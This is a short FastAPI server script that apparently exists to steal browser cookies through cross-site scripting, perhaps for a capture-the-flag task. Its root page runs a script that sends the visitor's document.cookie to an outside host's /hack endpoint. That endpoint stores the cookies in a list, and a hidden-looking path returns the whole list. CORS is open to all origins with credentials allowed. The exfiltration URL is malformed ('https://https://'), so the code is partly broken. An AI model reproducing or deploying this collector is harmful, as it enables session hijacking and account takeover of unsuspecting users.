from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.middleware.cors import CORSMiddleware


app = FastAPI(
    summary="http://109.233.56.90:11660/bot - задача"
)


app.add_middleware(
    CORSMiddleware, 
    allow_origins=["*"], 
    allow_credentials=True, 
    allow_methods=["*"], 
    allow_headers=["*"], 
)


data = []

@app.get("/")
def get_cookie(request: Request):
    domain = request.url.hostname
    return HTMLResponse(
        """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Document</title>
        </head>
        <body>
            <script>fetch(`https://https://knyazevi81-fastapi-xss-cookie-888f.twc1.net/hack?cookie=${document.cookie}`)</script>
        </body>
        </html>
        """
    )


@app.get("/hack")
def get_cookie(cookie: str):
    data.append(cookie)
    return {"status": 200}

@app.get("/klkfmwelkfmewlfnl/cookie")
def get_cookie_list():
    return data
